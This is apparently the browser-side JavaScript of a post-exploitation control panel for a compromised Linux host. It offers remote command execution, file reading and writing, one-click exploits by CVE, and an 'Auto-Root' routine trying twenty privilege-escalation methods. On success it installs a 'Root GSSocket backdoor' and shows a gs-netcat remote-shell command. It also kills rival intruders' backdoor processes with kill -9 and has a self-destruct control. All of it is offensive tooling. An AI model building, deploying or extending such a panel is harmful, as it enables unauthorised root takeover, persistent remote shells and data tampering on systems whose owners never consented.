const $=id=>document.getElementById(id);
const api=async(e,d)=>{try{const r=await fetch('/api/'+e,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d||{})});return r.json();}catch(x){return{error:x.message}}};
const log=(el,t,c)=>{if(!$(el))return;const d=document.createElement('div');d.className='ln '+(c||'');d.textContent=t;$(el).appendChild(d);$(el).scrollTop=1e9;};
const clear=el=>{if($(el))$(el).innerHTML='';};
const copyThis=el=>{navigator.clipboard.writeText(el.innerText);el.style.borderColor='var(--green)';setTimeout(()=>el.style.borderColor='',800);};

document.querySelectorAll('.nav-item[data-p]').forEach(n=>n.onclick=()=>nav(n.dataset.p));

let cwd='/',myGs='',currentFile='',sysData={};

function nav(p){document.querySelectorAll('.page').forEach(x=>x.classList.remove('on'));document.querySelectorAll('.nav-item').forEach(x=>x.classList.remove('on'));$('p-'+p)?.classList.add('on');document.querySelector('.nav-item[data-p="'+p+'"]')?.classList.add('on');if(p==='exp')loadExp();if(p==='proc')loadProc();if(p==='gs')gsScan();if(p==='files')fmLoad(cwd);}
function openModal(id){$(id).classList.add('on');}
function closeModal(id){$(id).classList.remove('on');}

async function init(){
myGs=$('my-gs')?.innerText||'';
const r=await api('run',{path:'scripts/sysinfo.sh'});
try{const d=JSON.parse(r.output||'{}');sysData=d;$('s_user').textContent=d.user||'-';$('s_uid').textContent='uid:'+(d.uid||'?');$('s_kernel').textContent=(d.kernel||'-').split('-')[0];$('s_up').textContent=d.uptime||'-';$('s_mem').textContent=d.mem||'-';$('th').textContent=d.hostname||'target';document.title='DZ • '+(d.hostname||'target');$('cfg-info').textContent=JSON.stringify(d,null,2);}catch(e){}
fmLoad('/');startLive();checkGsAlert();initMethodList();
}

function startLive(){async function u(){const r=await api('exec',{cmd:"cat /proc/loadavg 2>/dev/null|awk '{print $1}';free 2>/dev/null|awk '/Mem:/{if($2>0)print int($3*100/$2);else print 0}';df / 2>/dev/null|tail -1|awk '{gsub(/%/,\"\");print $5}'"});const[load,mem,disk]=(r.output||'0\n0\n0').trim().split('\n');$('live-stats').innerHTML=`<div style="margin-bottom:8px"><div style="display:flex;justify-content:space-between;font-size:10px"><span>CPU</span><span>${load}</span></div></div><div style="margin-bottom:8px"><div style="display:flex;justify-content:space-between;font-size:10px"><span>MEM</span><span>${mem}%</span></div><div class="stat-bar"><i style="width:${mem}%;background:${mem>80?'var(--red)':'var(--green)'}"></i></div></div><div><div style="display:flex;justify-content:space-between;font-size:10px"><span>DISK</span><span>${disk}%</span></div><div class="stat-bar"><i style="width:${disk}%;background:${disk>80?'var(--red)':'var(--green)'}"></i></div></div>`;}u();setInterval(u,5000);}

async function checkGsAlert(){const r=await api('run',{path:'scripts/gscan.sh'});try{const d=JSON.parse(r.output||'{}');const hostile=(d.gsockets||[]).filter(g=>!g.type&&g.secret&&g.secret!==myGs&&g.secret!=='hidden');if(hostile.length)$('dash-alert').innerHTML=`<div class="alert"><span class="alert-icon">🚨</span><div class="alert-text"><strong>${hostile.length} Hostile GSockets!</strong><a href="#" onclick="nav('gs');return false" style="color:var(--gold)">View →</a></div></div>`;}catch(e){}}

// LPE Methods
const LPE_METHODS=['Sudo NOPASSWD','SUID Binaries','Writable /etc/passwd','Docker Socket','Capabilities','Kernel Exploit','Cron Jobs','LD_PRELOAD','Redis','Password Reuse','NFS no_root_squash','Writable PATH','D-Bus','LXD/LXC','Systemd','SSH Keys','MySQL UDF','Tmux/Screen','Process Monitor','Final Checks'];
function initMethodList(){let h='';LPE_METHODS.forEach((m,i)=>{h+=`<div class="method-item" id="method-${i}"><span class="method-name">${String(i+1).padStart(2,'0')}. ${m}</span><span class="method-status pending" id="mstat-${i}">pending</span></div>`;});$('method-list').innerHTML=h;}

async function runAutoRoot(){
$('btn-autoroot').disabled=true;$('btn-autoroot').textContent='Running...';
clear('root-out');$('root-success').style.display='none';$('root-result').innerHTML='';
initMethodList();
log('root-out','Starting Auto-Root (20 LPE methods)...','cmd');
log('root-out','Executing in parallel for speed...','warn');

let idx=0;
const interval=setInterval(()=>{if(idx<20){$('mstat-'+idx).textContent='checking';$('mstat-'+idx).className='method-status checking';idx++;}},800);

const r=await api('run',{path:'lpe_methods/runner.sh'});
clearInterval(interval);

(r.output||'').split('\n').forEach(l=>{
if(l.includes('[✓]'))log('root-out',l,'ok');
else if(l.includes('[✗]'))log('root-out',l,'err');
else if(l.includes('[!]'))log('root-out',l,'warn');
else if(l.includes('[*]'))log('root-out',l,'cmd');
else if(l.trim())log('root-out',l,'');
});

try{
const jsonMatch=r.output.match(/\{[\s\S]*"root_achieved"[\s\S]*\}/);
if(jsonMatch){
const result=JSON.parse(jsonMatch[0]);
result.methods?.forEach((m,i)=>{if($('mstat-'+i)){$('mstat-'+i).textContent=m.status;$('mstat-'+i).className='method-status '+(m.status==='success'?'success':m.status==='fail'?'failed':'checking');}});
if(result.root_achieved&&result.root_secret){
$('root-success').style.display='flex';
$('root-success-msg').textContent='Method: '+result.root_method;
$('root-result').innerHTML=`<div class="root-box"><h3>🎉 ROOT ACCESS!</h3><p style="font-size:11px;color:var(--text)">Root GSSocket backdoor installed.</p><code onclick="navigator.clipboard.writeText(this.textContent)">gs-netcat -s ${result.root_secret} -i</code></div>`;
}else{
$('root-result').innerHTML=`<div class="alert"><span class="alert-icon">❌</span><div class="alert-text"><strong>Direct root not achieved</strong>Check output for partial findings.</div></div>`;
}
}
}catch(e){console.error(e);}
$('btn-autoroot').disabled=false;$('btn-autoroot').textContent='🚀 Start Auto-Root';
}

async function loadExp(){$('exp-list').innerHTML='Loading...';const r=await api('run',{path:'exploits/gate.sh'});try{const d=JSON.parse(r.output||'{}');let h='';(d.exploits||[]).forEach(x=>{const c=x.rate>=80?'var(--green)':'var(--gold)';h+=`<div class="method-item" onclick="runExp('${x.cve}')"><span style="color:var(--gold);width:120px;font-family:'JetBrains Mono'">${x.cve}</span><span class="method-name">${x.name}</span><span style="color:${c}">${x.rate}%</span></div>`;});$('exp-list').innerHTML=h||'No exploits';}catch(e){$('exp-list').innerHTML='Error';}}
async function runExp(cve){if(!confirm('Run '+cve+'?'))return;const r=await api('run',{path:'exploits/'+cve+'/run.sh'});alert(r.output||'Done');}

async function rs(path){clear('term-out');log('term-out','$ bash '+path,'cmd');const r=await api('run',{path});(r.output||'').split('\n').forEach(l=>log('term-out',l,'ok'));}
async function termExec(){const c=$('term-cmd').value.trim();if(!c)return;$('term-cmd').value='';log('term-out','$ '+c,'cmd');const r=await api('exec',{cmd:c});(r.output||'').split('\n').forEach(l=>log('term-out',l,''));}
async function termExec2(c){clear('term-out');log('term-out','$ '+c,'cmd');const r=await api('exec',{cmd:c});(r.output||'').split('\n').forEach(l=>log('term-out',l,''));nav('term');}
async function loadProc(){clear('proc-out');log('proc-out','$ ps aux --sort=-%mem','cmd');const r=await api('exec',{cmd:'ps aux --sort=-%mem|head -40'});(r.output||'').split('\n').forEach(l=>log('proc-out',l,''));}

// File Manager
async function fmLoad(path){cwd=path;$('fm-path').innerHTML=path.split('/').filter(Boolean).reduce((a,x,i,arr)=>{const fp='/'+arr.slice(0,i+1).join('/');return a+' / <a href="#" onclick="fmLoad(\''+fp+'\');return false">'+x+'</a>';},'<a href="#" onclick="fmLoad(\'/\');return false">~</a>');const r=await api('files',{path});let h='';if(path!=='/'){const pr=path.split('/').slice(0,-1).join('/')||'/';h+=`<div class="fm-item" ondblclick="fmLoad('${pr}')"><div class="fm-icon dir">⬆</div><div class="fm-info"><div class="fm-name">..</div></div></div>`;}(r.files||[]).sort((a,b)=>(b.type==='dir')-(a.type==='dir')||a.name.localeCompare(b.name)).forEach(f=>{const fp=path==='/'?'/'+f.name:path+'/'+f.name;const isDir=f.type==='dir';const ext=f.name.split('.').pop().toLowerCase();const icons={sh:'⚡',py:'🐍',js:'📜',c:'©',txt:'📝',conf:'⚙',gz:'📦',tar:'📦'};h+=`<div class="fm-item" ondblclick="${isDir?`fmLoad('${fp}')`:`fmView('${fp}')`}" oncontextmenu="fmCtx(event,'${fp}')"><div class="fm-icon ${isDir?'dir':''}">${isDir?'📁':(icons[ext]||'📄')}</div><div class="fm-info"><div class="fm-name">${f.name}</div><div class="fm-meta">${f.perm||''} • ${f.size||''}</div></div></div>`;});$('fm-list').innerHTML=h||'Empty';}
function fmUp(){fmLoad(cwd.split('/').slice(0,-1).join('/')||'/');}
function fmRefresh(){fmLoad(cwd);}
async function fmView(path){currentFile=path;$('modal-view-title').textContent=path.split('/').pop();const r=await api('read',{path});$('modal-view-content').textContent=r.content||'(empty/binary)';openModal('modal-view');}
async function fmEdit(path){currentFile=path;$('modal-edit-title').textContent='Edit: '+path.split('/').pop();const r=await api('read',{path});$('modal-edit-content').value=r.content||'';closeModal('modal-view');openModal('modal-edit');}
async function fmSaveEdit(){await api('write',{path:currentFile,content:$('modal-edit-content').value});closeModal('modal-edit');fmRefresh();}
function fmNewFile(){$('modal-new-name').value='';$('modal-new-content').value='';openModal('modal-new');}
function fmNewDir(){const n=prompt('Folder name:');if(n)api('mkdir',{path:cwd+'/'+n}).then(fmRefresh);}
async function fmSaveNew(){const n=$('modal-new-name').value.trim();if(!n)return;await api('write',{path:cwd+'/'+n,content:$('modal-new-content').value});closeModal('modal-new');fmRefresh();}
async function fmDelete(path){if(!confirm('Delete?'))return;await api('delete',{path});fmRefresh();}
function fmDownload(path){window.open('/api/download?path='+encodeURIComponent(path));}
async function fmUpload(files){for(const f of files){const reader=new FileReader();reader.onload=async e=>{await api('write',{path:cwd+'/'+f.name,content:e.target.result});fmRefresh();};reader.readAsText(f);}}
function fmCtx(e,path){e.preventDefault();const c=prompt('1=View 2=Edit 3=Download 4=Delete');if(c==='1')fmView(path);else if(c==='2')fmEdit(path);else if(c==='3')fmDownload(path);else if(c==='4')fmDelete(path);}

// GSockets
async function gsScan(){$('gs-list').innerHTML='Scanning...';const r=await api('run',{path:'scripts/gscan.sh'});try{const d=JSON.parse(r.output||'{}');const procs=(d.gsockets||[]).filter(g=>!g.type);const hostile=procs.filter(g=>g.secret!==myGs);$('gs-alert').innerHTML=hostile.length?`<div class="alert"><span class="alert-icon">🚨</span><div class="alert-text"><strong>${hostile.length} Hostile!</strong></div><button class="btn btn-sm btn-red" onclick="gsKillAll()">Kill All</button></div>`:'';let h='';procs.forEach(g=>{const mine=g.secret===myGs;h+=`<div class="gs-card ${mine?'mine':'hostile'}"><div class="gs-header"><span class="gs-badge ${mine?'yours':'hostile'}">${mine?'YOURS':'HOSTILE'}</span><span class="gs-secret">${g.secret||'hidden'}</span>${mine?'':`<button class="btn btn-sm btn-red" onclick="gsKill(${g.pid})">Kill</button>`}</div><div class="gs-body"><table><tr><td>PID</td><td>${g.pid}</td></tr><tr><td>User</td><td>${g.user}</td></tr></table></div></div>`;});$('gs-list').innerHTML=h||'<div style="padding:20px;text-align:center;color:var(--green)">✓ No hostile</div>';}catch(e){$('gs-list').innerHTML='Error';}}
async function gsKill(pid){await api('exec',{cmd:'kill -9 '+pid});gsScan();}
async function gsKillAll(){const r=await api('run',{path:'scripts/gscan.sh'});try{const d=JSON.parse(r.output||'{}');const pids=(d.gsockets||[]).filter(g=>!g.type&&g.secret!==myGs).map(g=>g.pid).filter(Boolean);if(pids.length)await api('exec',{cmd:'kill -9 '+pids.join(' ')});}catch(e){}gsScan();}

async function pull(){await api('pull');location.reload();}
async function nuke(){if(!confirm('⚠️ DESTRUCT?'))return;await api('destruct');document.body.innerHTML='<div style="display:flex;height:100vh;align-items:center;justify-content:center;background:#000;color:var(--red);font-size:24px">💀 DESTROYED</div>';}

init();
